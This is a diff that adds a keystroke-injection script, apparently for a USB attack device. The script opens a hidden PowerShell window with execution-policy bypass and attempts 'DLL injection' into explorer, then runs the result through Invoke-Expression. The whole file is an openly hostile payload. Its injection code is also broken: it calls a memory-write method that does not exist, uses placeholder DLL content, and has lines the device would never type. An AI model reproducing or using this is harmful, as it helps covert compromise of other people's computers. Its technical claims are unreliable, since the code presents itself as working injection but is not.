@@ -1,0 +1,17 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM DLL injection
+$string = @"
+`$process = Get-Process explorer
+`$dllPath = "$env:TEMP\malicious.dll"
+`$bytes = [System.Text.Encoding]::UTF8.GetBytes("malicious_dll_content")
+`$bytes | Out-File -FilePath $dllPath -Encoding Byte
+`$process.MainModule.WriteMemory($process.MainModule.BaseAddress, $bytes, $bytes.Length)
+"@
+ENTER
+DELAY 500
+STRING $string | Invoke-Expression
